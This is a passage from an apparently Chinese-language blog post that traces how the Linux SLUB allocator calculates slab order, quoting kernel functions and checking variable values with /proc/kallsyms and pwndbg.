class="line"><span class="keyword">return</span> x.x &gt;&gt; OO_SHIFT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!folio)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">slab = folio_slab(folio);</span><br><span class="line">__folio_set_slab(folio);</span><br><span class="line"><span class="comment">/* Make the flag visible before any changes to folio-&gt;mapping */</span></span><br><span class="line">smp_wmb();</span><br><span class="line"><span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在<code>alloc_slab_page</code>函数中使用order是在oo中，而这个oo这时<code>kmem_cache</code>结构体中的成员。</p><h3 id="kmem-cache-create-usercopy流程"><a href="#kmem-cache-create-usercopy流程" class="headerlink" title="kmem_cache_create_usercopy流程"></a>kmem_cache_create_usercopy流程</h3><p><code>kmem_cache_create_usercopy</code>用来注册一个cache，所以他也会分配一个slab供他自己使用，不过分配的时间点是在这个cache中第一次申请object的时候触发的。而<code>kmem_cache_create_usercopy</code>函数主要是对slab的初始化，其中就包括了我们比较关注的<code>order</code>了。</p><p>因为前半部分的函数都没有直接和<code>order</code>产生关系，所以这里就给一下大家调用连不贴源码占篇幅了。</p><p><code>kmem_cache_create_usercopy</code>=&gt;<code>create_cache</code>=&gt;<code>__kmem_cache_create</code>=&gt;<code>kmem_cache_open</code>=&gt;<code>calculate_sizes</code></p><h4 id="calculate-sizes函数"><a href="#calculate-sizes函数" class="headerlink" title="calculate_sizes函数"></a>calculate_sizes函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">calculate_sizes</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">slab_flags_t</span> flags = s-&gt;flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> size = s-&gt;object_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">order = calculate_order(size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">int</span>)order &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">s-&gt;allocflags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (order)</span><br><span class="line">s-&gt;allocflags |= __GFP_COMP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_CACHE_DMA32)</span><br><span class="line">s-&gt;allocflags |= GFP_DMA32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_RECLAIM_ACCOUNT)</span><br><span class="line">s-&gt;allocflags |= __GFP_RECLAIMABLE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine the number of objects per slab</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">s-&gt;oo = oo_make(order, size);</span><br><span class="line">s-&gt;min = oo_make(get_order(size), size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> !!oo_objects(s-&gt;oo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在函数最后这部分就是对oo的赋值，所以理所应当去<code>calculate_order</code>理清逻辑。</p><h4 id="calculate-order函数"><a href="#calculate-order函数" class="headerlink" title="calculate_order函数"></a>calculate_order函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (min_objects &gt; <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> fraction;</span><br><span class="line"></span><br><span class="line">fraction = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">while</span> (fraction &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">order = calc_slab_order(size, min_objects,</span><br><span class="line">slub_max_order, fraction);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line">fraction /= <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">min_objects--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We were unable to place multiple objects in a slab. Now</span></span><br><span class="line"><span class="comment"> * lets see if we can place a single object there.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, slub_max_order, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt;= slub_max_order)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Doh this slab cannot be placed using slub_max_order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">order = calc_slab_order(size, <span class="number">1</span>, MAX_ORDER, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (order &lt; MAX_ORDER)</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line"><span class="keyword">return</span> -ENOSYS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以注意到最终的order是由<code>calc_slab_order</code>函数生成的。而这里的<code>min_objects</code>变量可以看到是由<code>slub_min_objects</code>赋值的。这个全局变量的含义是：每个slab的最小object数量，在没有配置的情况下是0。不过可以看到如果是0的话会进入到紧接着的if语句内，内部的<code>nr_cpu_ids</code>变量的值是处理器数。fls 可以获取参数的最高有效 bit 的位数，比如 fls(0)=0，fls(1)=1，fls(4) = 3。如果当前系统中有4个cpu，那么 min_object 的初始值为 4*(3+1) = 16。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep slub_min_objects</span><br><span class="line">ffffffff8a23b2d0 t __cfi_setup_slub_min_objects</span><br><span class="line">ffffffff8a23b2e0 t setup_slub_min_objects</span><br><span class="line">ffffffff8a4348af t __setup_str_setup_slub_min_objects</span><br><span class="line">ffffffff8a45e460 t __setup_setup_slub_min_objects</span><br><span class="line">ffffffff8b3d5fbc b slub_min_objects</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff8b3d5fbc</span><br><span class="line">0xffffffff8b3d5fbc:0x00000000</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~ cat /proc/kallsyms | grep nr_cpu_ids</span><br><span class="line">ffffffff97f73fa8 D nr_cpu_ids</span><br><span class="line">ffffffff98025f10 T __cfi_setup_nr_cpu_ids</span><br><span class="line">ffffffff98025f20 T setup_nr_cpu_ids</span><br><span class="line">ffffffff990f3098 b rcu_init_geometry.old_nr_cpu_ids</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/1xw 0xffffffff97f73fa8</span><br><span class="line">0xffffffff97f73fa8:0x00000004</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>按照上述步骤查看之后可以看到<code>nr_cpu_ids</code>的值为4，所以这里的<code>min_object</code>的值为<code>0x10</code>。</p><p>而函数中<code>fraction</code>是对于碎片的一种指标。碎片大小不能超过 (slab所占内存大小 / fraction)，fraction 值越大，slab 中所能容忍的碎片就越小。</p><h4 id="calc-slab-order函数"><a href="#calc-slab-order函数" class="headerlink" title="calc_slab_order函数"></a>calc_slab_order函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ilog2</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ((<span class="number">1UL</span> &lt;&lt; l) &lt; v)</span><br><span class="line">l++;</span><br><span class="line"><span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline __attribute_const__ <span class="keyword">int</span> <span class="title">get_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (__builtin_constant_p(size)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> BITS_PER_LONG - PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt; (<span class="number">1UL</span> &lt;&lt; PAGE_SHIFT))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ilog2((size) - <span class="number">1</span>) - PAGE_SHIFT + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">size--;</span><br><span class="line">size &gt;&gt;= PAGE_SHIFT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> BITS_PER_LONG == 32</span></span><br><span class="line"><span class="keyword">return</span> fls(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> fls64(size);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">calc_slab_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects, <span class="keyword">unsigned</span> <span class="keyword">int</span> max_order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> fract_leftover)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_order = slub_min_order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (order_objects(min_order, size) &gt; MAX_OBJS_PER_PAGE)</span><br><span class="line"><span class="keyword">return</span> get_order(size * MAX_OBJS_PER_PAGE) - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (order = max(min_order, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_order(min_objects * size));</span><br><span class="line">order &lt;= max_order; order++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> slab_size = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> rem;</span><br><span class="line"></span><br><span class="line">rem = slab_size % size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rem &lt;= slab_size / fract_leftover)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> order;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数就是最终计算出<code>order</code>的函数了，可以看到这里会从slab所需要的最小order到最大order之间开始遍历，查找能够使slab碎片最小的order值。而rem则是slab的碎片大小：分配完object之后，所产生的碎片大小。碎片大小rem不能超过<code>slab_size / fract_leftover</code>即符合要求。</p><p>这里的<code>get_order</code>函数也较为简单，<del>这狗屎玩意，开始看错了文件导致一直看不懂，硬生生看了两个小时才反应过来了</del>。也就是根据size返回对应的最小的<code>order</code>，所以这里的如果根据上一个函数中的<code>min_object</code>的值为<code>0x10</code>来看的话，最终返回的<code>order</code>也就是3。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct kmem_cache_order_objects <span class="title">oo_make</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">x</span> =</span> &#123;</span><br><span class="line">(order &lt;&lt; OO_SHIFT) + order_objects(order, size)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后由<code>oo_make</code>函数写入到oo成员中去了。</p><h3 id="kmem-cache-alloc流程"><a href="#kmem-cache-alloc流程" class="headerlink" title="kmem_cache_alloc流程"></a>kmem_cache_alloc流程</h3><p>可以看到前面<code>kmem_cache_create_usercopy</code>函数只是对<code>kmem_cache</code>结构体里面的成员进行初始化赋值，并没有实质性的生成slab。而真正分配slab是在第一次对这个cache申请object的时候，也就是这个小标题的函数。</p><p>这里的调用流程就是：<code>kmem_cache_alloc</code>=&gt;<code>__kmem_cache_alloc_lru</code>=&gt;<code>slab_alloc</code>=&gt;<code>slab_alloc_node</code>=&gt;<code>__slab_alloc_node</code>=&gt;<code>new_slab</code>=&gt;<code>allocate_slab</code>=&gt;<code>alloc_slab_page</code></p><h4 id="slab-alloc-node函数"><a href="#slab-alloc-node函数" class="headerlink" title="__slab_alloc_node函数"></a>__slab_alloc_node函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc_node(struct kmem_cache *s,</span><br><span class="line"><span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">size_t</span> orig_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line">pc.flags = gfpflags;</span><br><span class="line">pc.slab = &amp;slab;</span><br><span class="line">pc.orig_size = orig_size;</span><br><span class="line">object = get_partial(s, node, &amp;pc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (object)</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line"></span><br><span class="line">slab = new_slab(s, gfpflags, node);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">slab_out_of_memory(s, gfpflags, node);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">object = alloc_single_from_new_slab(s, slab, orig_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到分配顺序就是首先访问<code>partial</code>指针中，如果其中没有可以返回的object就会执行到<code>new_slab</code>函数分配新的slab。</p><h4 id="alloc-single-from-new-slab函数"><a href="#alloc-single-from-new-slab函数" class="headerlink" title="alloc_single_from_new_slab函数"></a>alloc_single_from_new_slab函数</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">alloc_single_from_new_slab</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">struct slab *slab, <span class="keyword">int</span> orig_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> nid = slab_nid(slab);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> get_node(s, nid);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"><span class="keyword">void</span> *object;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">object = slab-&gt;freelist;</span><br><span class="line">slab-&gt;freelist = get_freepointer(s, object);</span><br><span class="line">slab-&gt;inuse = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!alloc_debug_processing(s, slab, object, orig_size))</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It&#x27;s not really expected that this would fail on a</span></span><br><span class="line"><span class="comment"> * freshly allocated slab, but a concurrent memory</span></span><br><span class="line"><span class="comment"> * corruption in theory could cause that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;inuse == slab-&gt;objects)</span><br><span class="line">add_full(s, n, slab);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">add_partial(n, slab, DEACTIVATE_TO_HEAD);</span><br><span class="line"></span><br><span class="line">inc_slabs_node(s, nid, slab-&gt;objects);</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要做的事就是首先取下<code>freelist</code>指向的object，随后将slab添加到<code>partial</code>指针处。</p><h4 id="allocate-slab函数"><a href="#allocate-slab函数" class="headerlink" title="allocate_slab函数"></a>allocate_slab函数</h4><p>上面提到了<code>new_slab</code>函数，其实实质上调用的是这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct slab *<span class="title">allocate_slab</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span> =</span> s-&gt;oo;</span><br><span class="line"><span class="keyword">gfp_t</span> alloc_gfp;</span><br><span class="line"><span class="keyword">void</span> *start, *p, *next;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"><span class="keyword">bool</span> shuffle;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) &#123;</span><br><span class="line">oo = s-&gt;min;</span><br><span class="line">alloc_gfp = flags;</span><br><span 